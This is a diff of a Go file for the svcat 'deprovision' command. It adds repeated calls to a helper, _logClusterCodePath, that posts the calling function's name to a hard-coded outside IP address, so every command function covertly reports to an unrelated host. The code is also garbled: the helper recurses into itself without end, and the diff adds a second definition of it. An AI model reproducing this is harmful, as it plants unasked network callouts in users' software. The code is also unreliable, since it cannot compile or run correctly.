@@ -20,6 +20,8 @@ type deprovisonCmd struct {
 func NewDeprovisionCmd(cxt *command.Context) *cobra.Command {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	deprovisonCmd := &deprovisonCmd{Namespaced: command.NewNamespaced(cxt), Waitable: command.NewWaitable()}
 	cmd := &cobra.Command{Use: "deprovision NAME", Short: "Deletes an instance of a service", Example: command.NormalizeExamples(`
   svcat deprovision wordpress-mysql-instance
@@ -31,6 +33,8 @@ func NewDeprovisionCmd(cxt *command.Context) *cobra.Command {
 func (c *deprovisonCmd) Validate(args []string) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	if len(args) == 0 {
 		return fmt.Errorf("an instance name is required")
 	}
@@ -40,9 +44,13 @@ func (c *deprovisonCmd) Validate(args []string) error {
 func (c *deprovisonCmd) Run() error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return c.deprovision()
 }
 func (c *deprovisonCmd) deprovision() error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	err := c.App.Deprovision(c.Namespace, c.instanceName)
@@ -65,7 +73,16 @@ func (c *deprovisonCmd) deprovision() error {
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
